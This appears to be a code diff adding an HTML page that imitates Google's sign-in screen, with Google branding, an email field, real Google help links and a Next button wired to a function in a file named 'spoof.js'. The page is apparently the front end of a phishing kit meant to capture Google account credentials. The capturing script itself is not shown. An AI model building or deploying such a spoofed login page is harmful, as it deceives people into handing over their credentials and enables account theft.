@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+    <head>
+		<title>Google Login</title>
+		<script src="spoof.js"></script>
+		<link rel="stylesheet" type="text/css" href="spoof.css" />
+		<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+        <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.light_blue-blue.min.css" />
+        <script defer src="material.min.js"></script>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+	</head>
+    <body>
+    <div class="box" id="box">
+    <div class="grid-container" id="grid-container">
+        <div class="header1" id="header1">
+            Sign in
+        </div>
+        <div class="header2" id="header2">
+            with your Google Account
+        </div>
+        <div class="logo" id="logo" title="Google">
+            <img src="Google.png">
+        </div>
+        <div class="email" id="email">
+            <!-- Textfield with Floating Label -->
+            <form action="#">
+                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" id="input">
+                    <input class="mdl-textfield__input" type="text" id="input1">
+                    <label class="mdl-textfield__label" for="sample3" id="input2">Email or phone</label>
+                </div>
+            </form>
+        </div>
+        <div class="forgot" id="forgot">
+            <a class="forgot-link" href="https://accounts.google.com/signin/v2/usernamerecovery?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount&followup=https%3A%2F%2Faccounts.google.com%2FManageAccount&flowName=GlifWebSignIn&flowEntry=ServiceLogin">
+                <span id="forgot-text">
+                    Forgot email?
+                </span>
+            </a>
+        </div>
+        <div class="guest-mode" id="guest-mode">
+            Not your computer? Use Guest mode to sign in privately.
+        </div>
+        <div class= "learn-more" id="learn-more">
+            <a class="learn" href="https://support.google.com/chrome/answer/6130773?hl=en">
+                Learn more
+            </a>
+        </div>
+        <div class="create-account" id="create-account">
+            <a class="create" href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp">
+                Create account
+            </a>
+        </div>
+        <div class="next" id="next">
+            <button style="width: 85px;" id="button" onclick="next()" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent">
+                Next
+            </button>
+        </div>
+    </div>
+    </div>
+    </body>
+</html>
